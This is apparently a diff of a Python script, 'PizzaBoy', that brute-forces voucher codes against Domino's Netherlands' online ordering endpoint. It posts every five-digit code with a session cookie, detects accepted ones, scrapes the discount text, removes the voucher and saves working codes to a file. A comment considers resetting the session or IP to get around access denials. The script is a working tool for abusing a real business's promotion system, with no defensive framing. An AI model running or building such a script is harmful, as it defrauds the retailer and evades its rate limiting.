@@ -1,16 +1,18 @@
 import time
 import random
 import requests
+import calendar
+from lxml import html
 
 sessionid = ''
 basket = "https://bestellen.dominos.nl/eStore/nl/Basket/"
 cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
 checkurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"
 
+
 class PizzaBoy:
 
-    def __init__(self, runid):
-        self.runid = runid
+    def __init__(self):
         self.name = random.choice(['Donatello', 'Leonardo', 'Michelangelo', 'Rafael'])
         self.greet()
 
@@ -23,22 +25,16 @@ class PizzaBoy:
             code = self.adapt_code(code) if code < 10000 else str(code)
             self.try_code(code)
 
-    def adapt_code(self, code):
-        codestring = str(code)
-        prefix = '0' * (5 - len(codestring))
-        return prefix + codestring
-
     def try_code(self, code):
-        url = basket + "ApplyVoucher?voucherCode=" + str(code)
-        result = self.send_code(url)
-        if (result):
-            discount = self.get_discount_from_code(code)
-            self.remove_code_from_basket();
+        result = self.send_code(code)
+        if result:
+            discount = self.get_discount_from_basket()
+            self.remove_code_from_basket()
             self.remember_code_and_discount(code, discount)
             self.say_code_and_discount(code, discount)
 
-    def send_code(self, url):
-        cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
+    def send_code(self, code):
+        url = basket + "ApplyVoucher?voucherCode=" + str(code)
         r = requests.post(url, cookies=cookies)
         response = r.text
 
@@ -48,26 +44,44 @@ class PizzaBoy:
 
         return '{"Url":null,"Messages":null}' in response
 
-    def get_discount_from_code(self, code):
-        return 'discount'
+    @staticmethod
+    def get_discount_from_basket():
+        r = requests.get(checkurl, cookies=cookies)
+        text = requests.utils.get_unicode_from_response(r)
+        parsed = html.fromstring(text)
+        description = parsed.find_class('description')
+        return description[0].text_content()
 
-    def remove_code_from_basket(self):
-        pass
+    @staticmethod
+    def remove_code_from_basket():
+        timestamp = str(calendar.timegm(time.gmtime())) + '000'
+        removeurl = basket + "RemoveVoucher?orderItemId=1&timestamp=" + timestamp
+        requests.post(removeurl, cookies=cookies)
 
-    def go_to_sleep(self, seconds):
-        #todo: maybe reset the session id, or even ip
+    @staticmethod
+    def go_to_sleep(seconds):
+        # todo: maybe reset the session id, or even ip
+        print('I was denied access. Going to sleep for a bit')
         time.sleep(seconds)
 
-    def remember_code_and_discount(self, code, discount):
-        with open('codes{0}.txt'.format(self.runid), 'w') as file:
+    @staticmethod
+    def adapt_code(code):
+        codestring = str(code)
+        prefix = '0' * (5 - len(codestring))
+        return prefix + codestring
+
+    @staticmethod
+    def remember_code_and_discount(code, discount):
+        with open('codes.txt', 'w') as file:
             file.write('code: {0}\tdiscount: {1}\n'.format(code, discount))
 
-    def say_code_and_discount(self, code, discount):
+    @staticmethod
+    def say_code_and_discount(code, discount):
         print('code: {0}\tdiscount: {1}'.format(code, discount))
 
+
 def main():
-    runid = 0 #todo: increment run id
-    pb = PizzaBoy(runid)
+    pb = PizzaBoy()
     pb.run()
 
 if __name__ == '__main__':
